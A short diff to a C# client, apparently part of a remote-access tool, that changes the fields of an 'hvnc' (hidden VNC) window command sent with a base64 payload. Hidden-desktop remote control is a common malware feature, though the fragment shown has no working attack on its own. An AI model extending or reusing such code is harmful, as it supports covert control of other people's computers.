@@ -129,7 +129,9 @@ namespace winClient48
                 {
                     "hvnc",
                     "window",
-                    "start",
+                    "sc",
+                    m_szDesktopName,
+                    "1",
                     b64,
                     DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                 });
